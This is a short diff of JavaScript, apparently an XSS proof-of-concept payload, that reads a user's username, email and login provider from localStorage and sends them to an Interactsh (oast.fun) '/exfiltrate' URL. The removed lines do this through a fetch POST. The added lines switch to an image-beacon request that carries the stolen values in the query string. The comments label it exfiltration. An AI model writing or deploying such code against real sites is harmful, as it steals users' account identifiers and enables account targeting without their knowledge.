@@ -8,22 +8,9 @@
         var email = loginMethods[0].email;
         var provider = loginMethods[0].provider;
 
-        // Perform a request to an external server
-        fetch("https://yubxblgtavfgjjrnpubomk60qxuntudti.oast.fun/exfiltrate", {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json"
-          },
-          body: JSON.stringify({
-            username: username,
-            email: email,
-            provider: provider
-          })
-        }).then(response => {
-          console.log("Request sent successfully", response);
-        }).catch(error => {
-          console.error("Error sending request", error);
-        });
+        // Interactsh request exfiltration
+        var img = new Image();
+        img.src = "https://yubxblgtavfgjjrnpubomk60qxuntudti.oast.fun/exfiltrate?username=" + encodeURIComponent(username) + "&email=" + encodeURIComponent(email) + "&provider=" + encodeURIComponent(provider);
       } else {
         alert("recentLoginMethods not found in localStorage");
       }
